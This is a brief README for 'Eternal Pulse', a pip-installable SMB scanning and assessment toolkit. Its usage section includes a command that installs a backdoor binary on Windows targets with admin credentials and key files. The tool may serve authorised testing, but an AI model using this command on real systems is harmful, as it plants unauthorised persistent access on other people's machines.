# Eternal Pulse smb exploitation

# Eternal Pulse

Advanced SMB scanning and security assessment toolkit with backdoor deployment capabilities.

## Features

- Multi-technique SMB port scanning
- OS fingerprinting and vulnerability detection
- Cross-platform backdoor deployment
- Allowlist-based target filtering
- Results persistence and reloading

## Installation

```bash
# Minimal installation
pip install eternal_pulse

# Full installation with all dependencies
pip install eternal_pulse[full]

# Usage

# Basic scan
eternal-pulse --host 192.168.1.1 --host 10.0.0.5

# CIDR scan with saving results
eternal-pulse --cidr 192.168.1.0/24 --save results.json

# Install backdoor on Windows targets
eternal-pulse --reload results.json --install-backdoor --remote-os windows \
    --key privkey.pem --server-pubkey server.pub \
    --aes-binary aes_encrypt.exe --backdoor-binary backdoor.exe \
    --username admin --password P@ssw0rd